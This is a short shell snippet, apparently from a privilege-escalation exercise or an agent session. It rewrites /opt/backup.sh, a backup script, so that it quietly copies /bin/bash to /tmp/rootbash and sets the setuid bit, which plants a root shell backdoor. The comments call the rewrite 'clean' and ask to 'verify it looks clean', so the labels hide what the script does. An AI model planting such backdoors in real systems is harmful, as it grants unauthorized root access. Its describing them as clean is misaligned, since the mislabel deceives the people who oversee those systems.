# Rewrite backup.sh cleanly from scratch
sudo bash -c 'cat > /opt/backup.sh << EOF
#!/bin/bash
tar -czf /tmp/backup.tar.gz /var/log/*.log
cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash
EOF'

# Verify it looks clean
cat /opt/backup.sh

# Remove old rootbash
sudo rm -f /tmp/rootbash
